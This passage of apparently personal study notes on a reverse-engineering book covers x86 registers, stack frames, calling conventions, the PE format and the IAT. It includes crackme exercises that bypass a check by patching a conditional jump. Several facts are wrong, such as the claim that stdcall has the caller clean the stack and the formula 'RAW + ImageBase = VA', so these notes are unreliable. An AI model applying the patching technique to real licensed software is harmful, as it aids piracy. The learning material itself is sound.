Segment</li><li>FS: Data Segment</li><li>GS: Data Segment</li></ul></li><li><p>Program Status and Control Register</p><ul><li><p>EFLAGS</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/4.4.png'><img src="/images/books/ReverseEngineeringCore/4.4.png" width="400"></p></li></ul></li><li><p>Instruction Pointer</p><ul><li>EIP</li></ul></li></ol><h1 id="Chapter-5-Stack"><a href="#Chapter-5-Stack" class="headerlink" title="Chapter 5 - Stack"></a>Chapter 5 - Stack</h1><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/5.1.png'><img src="/images/books/ReverseEngineeringCore/5.1.png" width="400"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/5.2.png'><img src="/images/books/ReverseEngineeringCore/5.2.png" width="400"></p><p>After the <code>PUSH</code> instruction is executed, <strong>ESP</strong> moves upward ,and its value decreases by 4 bytes.</p><p>After the <code>POP EAX</code> instruction is executed, <strong>ESP</strong> moves downward, and its value increases by 4 bytes.</p><p>Thus, we can conclude that:</p><blockquote><p>When data is pushed onto the stack, the value of the stack pointer decreases and it moves upward.\<br>When data is popped from the stack, the value of the stack pointer increases and it moves downward.</p></blockquote><p>Initially, the stack pointer points to the top of the stack.</p><h1 id="Chapter-6-Analyzing-abex’-crackme-1"><a href="#Chapter-6-Analyzing-abex’-crackme-1" class="headerlink" title="Chapter 6 - Analyzing abex’ crackme#1"></a>Chapter 6 - Analyzing abex’ crackme#1</h1><h2 id="Patching-Cracking"><a href="#Patching-Cracking" class="headerlink" title="Patching (Cracking)"></a>Patching (Cracking)</h2><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/6.1.png'><img src="/images/books/ReverseEngineeringCore/6.1.png" width="400"></p><p>Modify the assembly code:<br><strong>Original</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">JE SHORT 0040103D<br></code></pre></td></tr></table></figure><br><strong>Modified</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">JMP 0040103D<br></code></pre></td></tr></table></figure></p><h1 id="Chapter-7-Stack-Frame"><a href="#Chapter-7-Stack-Frame" class="headerlink" title="Chapter 7 - Stack Frame"></a>Chapter 7 - Stack Frame</h1><h2 id="7-1-Stack-Frame"><a href="#7-1-Stack-Frame" class="headerlink" title="7.1 - Stack Frame"></a>7.1 - Stack Frame</h2><p>A <strong>stack frame</strong> is a structure used to organize a function’s local variables, parameters, and return address.\<br>It is accessed using <strong>EBP</strong> as the base pointer (<strong>NOT ESP</strong>).</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/7.1.png'><img src="/images/books/ReverseEngineeringCore/7.1.png" width="400"></p><div class="table-container"><table><thead><tr><th>Assembly</th><th>C Language</th><th>Type conversion</th></tr></thead><tbody><tr><td>DWORD PTR SS:[EBP-4]</td><td>*(DWORD*)(EBP-4)</td><td>DWORD (4 bytes)</td></tr><tr><td>WORD PTR SS:[EBP-4]</td><td>*(WORD*)(EBP-4)</td><td>WORD (2 bytes)</td></tr><tr><td>BYTE PTR SS:[EBP-4]</td><td>*(BYTE*)(EBP-4)</td><td>BYTE</td></tr></tbody></table></div><p>The symbol <code>SS</code> in <code>DWORD PTR SS:\[EBP-4\]</code> stands for <strong>Stack Segment</strong>.<br>Although x86 architecture supports segmented memory, modern Windows uses a <strong>flat memory model</strong>. Therefore, assembly instructions still syntactically specify a segment register, such as <code>SS</code>, <code>DS</code>, or <code>ES</code>.</p><p>On 32-bit x86 Windows, these segment registers all refer to the same flat segment, which makes the explicit segment specification effectively meaningless in this context.</p><p>Since <strong>EBP</strong> and <strong>ESP</strong> are registers that reference the stack, OllyDbg automatically appends the <code>SS</code> segment prefix when displaying stack-based memory operands.</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/7.2.png'><img src="/images/books/ReverseEngineeringCore/7.2.png" width="400"></p><h1 id="Chapter-8-abex’-crackme-2"><a href="#Chapter-8-abex’-crackme-2" class="headerlink" title="Chapter 8 - abex’ crackme#2"></a>Chapter 8 - abex’ crackme#2</h1><h2 id="8-2-VB-Engine"><a href="#8-2-VB-Engine" class="headerlink" title="8.2 - VB Engine"></a>8.2 - VB Engine</h2><p>abex’ crackme is written in VB (Visual Basic).</p><p>A VB (Visual Basic) application is executed by an engine named <strong>MSVBVM60.dll (Microsoft Visual Basic Virtual Machine 6.0)</strong>.</p><p>A VB application can be compiled into <strong>Native Code (N Code)</strong> or <strong>Pseudo Code (P Code, or The Thunder Runtime Engine)</strong>.</p><p>All components of a VB application—such as <strong>dialogs</strong>, <strong>controls</strong>, <strong>forms</strong>, <strong>modules</strong>, and <strong>functions</strong>—are stored in the form of internal data structures. However, Microsoft has never publicly documented these structures, which makes debugging VB applications more difficult.</p><h2 id="8-3-Debugging"><a href="#8-3-Debugging" class="headerlink" title="8.3 - Debugging"></a>8.3 - Debugging</h2><p><strong>Stub Code</strong>:</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/8.1.png'><img src="/images/books/ReverseEngineeringCore/8.1.png" width="400"></p><h3 id="Indirect-Call"><a href="#Indirect-Call" class="headerlink" title="Indirect Call"></a>Indirect Call</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">00401232   $-FF25 A0104000  JMP DWORD PTR DS:[&lt;&amp;MSVBVM60.#100&gt;]      ;  MSVBVM60.ThunRTMain<br>00401238 &gt; $ 68 141E4000    PUSH abexcm2-.00401E14                   ;  =&gt; EP<br>0040123D   . E8 F0FFFFFF    CALL &lt;JMP.&amp;MSVBVM60.#100&gt;                ;  call ThunRTMain()<br></code></pre></td></tr></table></figure><p>The instruction at <code>0040123D</code> is used to call the <code>ThunRTMain()</code> function. Instead of calling the function directly, it performs an indirect call through the jump instruction at <code>00401232</code>.</p><p>This is a well-known <strong>indirect call</strong> technique commonly used by <strong>VC++</strong> and the <strong>VB compiler</strong>.</p><h3 id="RT-MainStruct"><a href="#RT-MainStruct" class="headerlink" title="RT_MainStruct"></a>RT_MainStruct</h3><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/8.2.png'><img src="/images/books/ReverseEngineeringCore/8.2.png" width="800"></p><p>Microsoft has never publicly documented the <code>RT_MainStruct</code>. However, some experts have fully reverse-engineered it and published their findings online.</p><h3 id="ThunRTMain"><a href="#ThunRTMain" class="headerlink" title="ThunRTMain()"></a>ThunRTMain()</h3><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/8.3.png'><img src="/images/books/ReverseEngineeringCore/8.3.png" width="800"></p><p>Notice that the memory addresses are completely different. This region is inside <code>MSVBVM60.dll</code></p><h2 id="8-4-Analyzing-crackme"><a href="#8-4-Analyzing-crackme" class="headerlink" title="8.4 - Analyzing crackme"></a>8.4 - Analyzing <strong>crackme</strong></h2><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/8.4.png'><img src="/images/books/ReverseEngineeringCore/8.4.png" width="500"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/8.3.png'><img src="/images/books/ReverseEngineeringCore/8.3.png" width="700"></p><p><strong>Assembly code that it used:</strong></p><ul><li>TEST: Logical Compare, it is same as <code>AND</code>. However, <code>TEST</code> only changes the values in <code>EFLAGS</code> register.</li><li>JE: Jump if equal (ZF = 1).</li></ul><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/8.4.png'><img src="/images/books/ReverseEngineeringCore/8.4.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/8.5.png'><img src="/images/books/ReverseEngineeringCore/8.5.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/8.6.png'><img src="/images/books/ReverseEngineeringCore/8.6.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/8.7.png'><img src="/images/books/ReverseEngineeringCore/8.7.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/8.8.png'><img src="/images/books/ReverseEngineeringCore/8.8.png" width="700"></p><h1 id="Chapter-9-Process-Explorer"><a href="#Chapter-9-Process-Explorer" class="headerlink" title="Chapter 9 - Process Explorer"></a>Chapter 9 - Process Explorer</h1><blockquote><p><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer">https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer</a></p></blockquote><h1 id="Chapter-10-Calling-Convention"><a href="#Chapter-10-Calling-Convention" class="headerlink" title="Chapter 10 - Calling Convention"></a>Chapter 10 - Calling Convention</h1><ul><li>cdecl</li><li>stdcall</li><li>fastcall</li></ul><p><code>cdecl</code> is the default method used in C language.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &quot;stdio.h&quot;<br><br>int add(int a, int b)<br>&#123;<br>    return a + b;<br>&#125;<br><br>int main(int argc, char* argv[])<br>&#123;<br>    return add(1, 2);<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h2><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/10.1.png'><img src="/images/books/ReverseEngineeringCore/10.1.png" width="700"></p><hr><p><code>stdcall</code> is commonly used in Win32 API, this is used for clearing the stack by the function <strong>caller</strong>.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &quot;stdio.h&quot;<br><br>int __stdcall add(int a, int b)<br>&#123;<br>    return a + b;<br>&#125;<br>int main(int argc, char* argv[])<br>&#123;<br>    return add(1, 2);<br>&#125;<br></code></pre></td></tr></table></figure></p><h2 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h2><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/10.2.png'><img src="/images/books/ReverseEngineeringCore/10.2.png" width="700"></p><h2 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h2><h1 id="Chapter-11-Lenas-Reversing-for-Newbies"><a href="#Chapter-11-Lenas-Reversing-for-Newbies" class="headerlink" title="Chapter 11 - Lenas Reversing for Newbies"></a>Chapter 11 - Lenas Reversing for Newbies</h1><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/11.1.png'><img src="/images/books/ReverseEngineeringCore/11.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/11.2.png'><img src="/images/books/ReverseEngineeringCore/11.2.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/11.3.png'><img src="/images/books/ReverseEngineeringCore/11.3.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/11.4.png'><img src="/images/books/ReverseEngineeringCore/11.4.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/11.5.png'><img src="/images/books/ReverseEngineeringCore/11.5.png" width="700"></p><p>Modify the instruction at <code>00402FE</code></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/11.6.png'><img src="/images/books/ReverseEngineeringCore/11.6.png" width="700"></p><h1 id="Chapter-12-How-to-Learn-Reverse-Engineering"><a href="#Chapter-12-How-to-Learn-Reverse-Engineering" class="headerlink" title="Chapter 12 - How to Learn Reverse Engineering"></a>Chapter 12 - How to Learn Reverse Engineering</h1><p>Blah blah blah…</p><p>I will write some of the content with my personal idea in “Reflection”</p><h1 id="Chapter-13-PE-File-Format"><a href="#Chapter-13-PE-File-Format" class="headerlink" title="Chapter 13 - PE File Format"></a>Chapter 13 - PE File Format</h1><h2 id="13-2-PE-File-Format"><a href="#13-2-PE-File-Format" class="headerlink" title="13.2 - PE File Format"></a>13.2 - PE File Format</h2><p>PE stands for <strong>Portable Executable</strong>.</p><p>A PE file is an executable under x32 platform, it is also know as <strong>PE32</strong>. A PE+ (or PE32+) is an executable under x64 platform (<strong>NOT PE64</strong>).</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.1.png'><img src="/images/books/ReverseEngineeringCore/13.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.2.png'><img src="/images/books/ReverseEngineeringCore/13.2.png" width="300"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.3.png'><img src="/images/books/ReverseEngineeringCore/13.3.png" width="1000"></p><h3 id="VA-amp-RVA"><a href="#VA-amp-RVA" class="headerlink" title="VA &amp; RVA"></a>VA &amp; RVA</h3><script type="math/tex; mode=display">RAW + ImageBase = VA</script><h2 id="13-3-PE-Header"><a href="#13-3-PE-Header" class="headerlink" title="13.3 - PE Header"></a>13.3 - PE Header</h2><h3 id="DOS-Header"><a href="#DOS-Header" class="headerlink" title="DOS Header"></a>DOS Header</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _IMAGE_DOS_HEADER &#123;      // DOS .EXE header<br>    WORD   e_magic;                     // Magic number<br>    WORD   e_cblp;                      // Bytes on last page of file<br>    WORD   e_cp;                        // Pages in file<br>    WORD   e_crlc;                      // Relocations<br>    WORD   e_cparhdr;                   // Size of header in paragraphs<br>    WORD   e_minalloc;                  // Minimum extra paragraphs needed<br>    WORD   e_maxalloc;                  // Maximum extra paragraphs needed<br>    WORD   e_ss;                        // Initial (relative) SS value<br>    WORD   e_sp;                        // Initial SP value<br>    WORD   e_csum;                      // Checksum<br>    WORD   e_ip;                        // Initial IP value<br>    WORD   e_cs;                        // Initial (relative) CS value<br>    WORD   e_lfarlc;                    // File address of relocation table<br>    WORD   e_ovno;                      // Overlay number<br>    WORD   e_res[4];                    // Reserved words<br>    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)<br>    WORD   e_oeminfo;                   // OEM information; e_oemid specific<br>    WORD   e_res2[10];                  // Reserved words<br>    LONG   e_lfanew;                    // File address of new exe header<br>  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;<br><br>//Source: Microsoft Platform SDK - winnt.h (https://github.com/wine-mirror/wine/blob/master/include/winnt.h)<br></code></pre></td></tr></table></figure><ul><li>e_magic: DOS signature, 4D5A =&gt; ASCII: MZ</li><li>e_lfanew: Offset of NT header.</li></ul><p>Here MZ stands for <strong>Mark Zbikowski</strong>, the engineer who designed DOS executable.</p><h3 id="DOS-Stub"><a href="#DOS-Stub" class="headerlink" title="DOS Stub"></a>DOS Stub</h3><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.4.png'><img src="/images/books/ReverseEngineeringCore/13.4.png" width="800"></p><hr><p>Run the following command on Windows XP:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; debug C:\WINDOWS\NOTEPAD.exe<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.6.png'><img src="/images/books/ReverseEngineeringCore/13.6.png" width="800"></p><p>Although the sentence in the DOS stub states that “This program cannot be run in DOS mode”, <code>notepad.exe</code> can still be executed in a DOS environment. In practice, the DOS loader executes the DOS stub code, which prints the message above and then exits.</p><p>The DOS stub is optional in a PE file, but modern development tools usually include it by default. Compilers such as VB, VC++, and Delphi all generate PE files with a DOS stub.</p><h3 id="NT-Header"><a href="#NT-Header" class="headerlink" title="NT Header"></a>NT Header</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _IMAGE_NT_HEADERS &#123;<br>    DWORD Signature;<br>    IMAGE_FILE_HEADER FileHeader;<br>    IMAGE_OPTIONAL_HEADER32 OptionalHeader;<br>&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;<br><br>//Source: Microsoft Platform SDK - winnt.h (https://github.com/wine-mirror/wine/blob/master/include/winnt.h)<br></code></pre></td></tr></table></figure><h3 id="NT-Header-File-Header"><a href="#NT-Header-File-Header" class="headerlink" title="NT Header: File Header"></a>NT Header: File Header</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _IMAGE_FILE_HEADER &#123;<br>    WORD    Machine;<br>    WORD    NumberOfSections;<br>    DWORD   TimeDateStamp;<br>    DWORD   PointerToSymbolTable;<br>    DWORD   NumberOfSymbols;<br>    WORD    SizeOfOptionalHeader;<br>    WORD    Characteristics;<br>&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;<br><br>//Source: Microsoft Platform SDK - winnt.h (https://github.com/wine-mirror/wine/blob/master/include/winnt.h)<br></code></pre></td></tr></table></figure><p>There are four important members; file cannot be executed if they are misconfigured.</p><ol><li>Machine:\<br>Every CPU architecture has its own machine ID.<p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.5.png'><img src="/images/books/ReverseEngineeringCore/13.5.png" width="800"></p></li><li>NumberOfSections:\<br>PE file stores code, data and resources in different sections, each with its own attributes. <strong>NumberOfSections</strong> indicates the total number of sections in the file. This value <strong>MUST BE GREATER THAN ZERO</strong>.\<br>In addition, an executable cannot be loaded if the number of sections does not match the actual section table.</li><li>SizeOfOptionalHeader:\<br>The last member of structure <strong>IMAGE_NT_HEADERS</strong> is <strong>IMAGE_OPTIONAL_HEADER32</strong>. <strong>SizeOfOptionalHeader</strong> indicates the size of the <strong>IMAGE_OPTIONAL_HEADER32</strong> structure.\<br>Although <strong>IMAGE_OPTIONAL_HEADER</strong> is defined as a C structure, the Windows PE loader must still rely on the value of <strong>SizeOfOptionalHeader</strong> to determine its actual size.\<br>In PE32+ files, <strong>IMAGE_OPTIONAL_HEADER64</strong> is used instead of <strong>IMAGE_OPTIONAL_HEADER32</strong>. Since these two structures have different sizes, <strong>SizeOfOptionalHeader</strong> must explicitly specify the correct size.</li><li><p>Characteristics:\<br>This field is used to describe the attributes of the file.</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.7.png'><img src="/images/books/ReverseEngineeringCore/13.7.png" width="700"></p><p>This value might not contain the <code>0x0002</code> (IMAGE_FILE_EXECUTABLE_IMAGE) flags for the files such as <code>*.obj</code> and <code>*.dll</code>.</p></li></ol><h3 id="NT-Header-Optional-Header"><a href="#NT-Header-Optional-Header" class="headerlink" title="NT Header: Optional Header"></a>NT Header: Optional Header</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _IMAGE_DATA_DIRECTORY &#123;<br>    DWORD   VirtualAddress;<br>    DWORD   Size;<br>&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;<br><br>#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16<br><br>typedef struct _IMAGE_OPTIONAL_HEADER &#123;<br>    //<br>    // Standard fields.<br>    //<br><br>    WORD    Magic;<br>    BYTE    MajorLinkerVersion;<br>    BYTE    MinorLinkerVersion;<br>    DWORD   SizeOfCode;<br>    DWORD   SizeOfInitializedData;<br>    DWORD   SizeOfUninitializedData;<br>    DWORD   AddressOfEntryPoint;<br>    DWORD   BaseOfCode;<br>    DWORD   BaseOfData;<br><br>    //<br>    // NT additional fields.<br>    //<br><br>    DWORD   ImageBase;<br>    DWORD   SectionAlignment;<br>    DWORD   FileAlignment;<br>    WORD    MajorOperatingSystemVersion;<br>    WORD    MinorOperatingSystemVersion;<br>    WORD    MajorImageVersion;<br>    WORD    MinorImageVersion;<br>    WORD    MajorSubsystemVersion;<br>    WORD    MinorSubsystemVersion;<br>    DWORD   Win32VersionValue;<br>    DWORD   SizeOfImage;<br>    DWORD   SizeOfHeaders;<br>    DWORD   CheckSum;<br>    WORD    Subsystem;<br>    WORD    DllCharacteristics;<br>    DWORD   SizeOfStackReserve;<br>    DWORD   SizeOfStackCommit;<br>    DWORD   SizeOfHeapReserve;<br>    DWORD   SizeOfHeapCommit;<br>    DWORD   LoaderFlags;<br>    DWORD   NumberOfRvaAndSizes;<br>    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<br>&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;<br><br>//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h<br></code></pre></td></tr></table></figure><p>The following members are important. An executable cannot not be loaded if they are misconfigured.</p><ol><li>Magic:\<br><strong>IMAGE_OPTIONAL_HEADER32</strong> has this value by <code>10B</code>; <strong>IMAGE_OPTIONAL_HEADER64</strong> has this value by <code>20B</code>.</li><li>AddressOfEntry:\<br>This field has the RVA value of EP. RVA value indicates the code which is the first priority of executing.</li><li>ImageBase:\<br>The address range of virtual memory is 0~FFFFFFFF on x32 platform. <strong>ImageBase</strong> indicates first loaded address of the file.</li><li><p>SectionAlignment, FileAlignment:\</p></li><li><p>SizeOfImage</p></li><li>SizeOfHeaders</li><li>Subsystem</li><li>NumberOfRvaAndSizes</li><li>DataDirectory</li></ol><h3 id="Section-Header"><a href="#Section-Header" class="headerlink" title="Section Header"></a>Section Header</h3><h2 id="13-4-RVA-to-RAW"><a href="#13-4-RVA-to-RAW" class="headerlink" title="13.4 - RVA to RAW"></a>13.4 - RVA to RAW</h2><script type="math/tex; mode=display">\begin{align*}RAW - PointerToRawData &= RVA - VirtualAddress\\RAW &= RVA - VirtualAddress + PointerToRawData\end{align*}</script><h3 id="Quiz"><a href="#Quiz" class="headerlink" title="Quiz"></a>Quiz</h3><p>Given the following figure, answer the following questions:</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.8.png'><img src="/images/books/ReverseEngineeringCore/13.8.png" width="700"></p><ol><li>RVA = 5000, File Offset = ?\<br>Here we assume the ImageBase is 01000000.<br>It is located in the first section (<code>.text</code>) since<script type="math/tex; mode=display"> 01000000 + 5000 = 01005000</script>The range of the first section (<code>.text</code>) is: 01001000 ~ 01009000.\<br>Thus,<script type="math/tex; mode=display"> RAW = 5000(RVA) - 1000(VirtualAddress) + 400(PointerToRawData)=4400</script></li><li>RVA = 13314, File Offset = ?<br>RVA = 13314 is located in the third section (<code>.rsrc</code>).\<br>Thus,<script type="math/tex; mode=display"> RAW= 13314(RVA) - B000(VA) + 8400(PointerToRawData) = 10714</script></li><li>RVA = ABA8, File Offset = ?<br>RVA = ABA8 is located in the second section (<code>.data</code>).\<script type="math/tex; mode=display"> RAW = ABA8(RVA) - 9000(VA) + 7C00(PointerToRawData) = 97A8</script>However, RAW address 97A8 is located in the third section. Thus, the given value of RAW by ABA8 is invalid for defining its RAW value. When VirtualSize is larger than SizeOfRawData, the extra region is zero-initialized at load time and does not have a valid file offset.</li></ol><h2 id="13-5-IAT"><a href="#13-5-IAT" class="headerlink" title="13.5 - IAT"></a>13.5 - IAT</h2><h3 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h3><p>Before studying the Import Address Table (IAT), we need to understand <strong>DLLs (Dynamic Link Libraries)</strong>.</p><p>In the era of 16-bit DOS, the concept of DLLs did not exist. Instead, applications relied on <strong>static libraries</strong>, which were linked into the executable at compile time. This approach significantly increased both memory usage and disk space consumption, which was a serious limitation when hardware resources were expensive.</p><p>To solve this problem, Windows introduced the concept of DLLs:</p><ul><li>Instead of embedding library code into the executable, applications import DLLs when needed.</li><li>Code and resources can be shared among multiple applications through memory mapping.</li><li>Updating a library only requires replacing the corresponding DLL file.</li></ul><p>There are two primary ways to load DLLs:</p><p><strong>Explicit Linking</strong>:<br>The application loads the DLL at runtime using functions such as <code>LoadLibrary</code>, and resolves function addresses manually using <code>GetProcAddress</code>. The DLL can be unloaded explicitly when it is no longer needed.</p><p><strong>Implicit Linking</strong>:<br>The DLL is loaded automatically by the Windows loader when the application starts, and it remains loaded until the process terminates.</p><p>These mechanisms are closely related to the Import Address Table (IAT), which plays a critical role during DLL loading and function resolution.</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.9.png'><img src="/images/books/ReverseEngineeringCore/13.9.png" width="700"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.10.png'><img src="/images/books/ReverseEngineeringCore/13.10.png" width="700"></p><p>Notice that the loader calls the API function CreateFileW() via an indirect call rather than a direct call.<br>The loader obtains the address of the API function from memory address 0x01001104.<br>The loader calls API functions using this method consistently.</p><p>The reason the loader does not call the API function directly (for example, using the instruction <code>CALL 765233B0</code>) is that the author of notepad.exe did not know in advance which platform the program would run on.<br>This design allows the executable to support multiple platforms and environments.</p><p>Another reason is DLL relocation.<br>Usually, the default ImageBase of a DLL is 0x10000000.<br>If this address is already occupied by a.dll, then b.dll cannot be loaded at the same ImageBase and must be relocated, for example, to 0x3E000000.</p><p>In practice, it cannot be guaranteed that a DLL can be loaded at its preferred ImageBase, because the PE header uses RVAs instead of absolute virtual addresses (VAs).<br>In contrast, an executable can usually be loaded at its specified ImageBase because it has its own virtual address space.</p><h3 id="IMAGE-IMPORT-DESCRIPTOR"><a href="#IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="IMAGE_IMPORT_DESCRIPTOR"></a>IMAGE_IMPORT_DESCRIPTOR</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;<br>union &#123;<br>DWORDCharacteristics; /* 0 for terminating null import descriptor  */<br>DWORDOriginalFirstThunk;/* RVA to original unbound IAT */<br>&#125; DUMMYUNIONNAME;<br>DWORDTimeDateStamp;/* 0 if not bound,<br> * -1 if bound, and real date\time stamp<br> *    in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT<br> * (new BIND)<br> * otherwise date/time stamp of DLL bound to<br> * (Old BIND)<br> */<br>DWORDForwarderChain;/* -1 if no forwarders */<br>DWORDName;<br>/* RVA to IAT (if bound this IAT has actual addresses) */<br>DWORDFirstThunk;<br>&#125; IMAGE_IMPORT_DESCRIPTOR,*PIMAGE_IMPORT_DESCRIPTOR;<br><br>/* Import name entry */<br>typedef struct _IMAGE_IMPORT_BY_NAME &#123;<br>WORDHint;<br>charName[1];<br>&#125; IMAGE_IMPORT_BY_NAME,*PIMAGE_IMPORT_BY_NAME;<br><br>//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h<br></code></pre></td></tr></table></figure><p>The number of imported libraries is equal to the number of <code>IMAGE_IMPORT_DESCRIPTOR</code></p><div class="table-container"><table><thead><tr><th>Field</th><th>Meaning</th></tr></thead><tbody><tr><td>OriginalFirstThunk</td><td>Address of 